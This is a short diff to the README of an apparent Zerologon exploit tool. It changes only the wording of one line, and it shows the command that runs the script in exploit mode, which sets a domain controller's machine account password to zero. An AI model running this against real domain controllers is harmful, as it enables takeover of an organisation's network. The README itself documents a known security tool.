@@ -45,6 +45,6 @@ Scans the target for the vulnerability
 
 ```python3 zerologon.py NETBIOS_NAME X.X.X.X -exploit```
 
-Scans the target then sets the account ("DC\_NAME$") password to 0
+Scans the target then sets the account ("NETBIOS_NAME$") password to 0
 
 
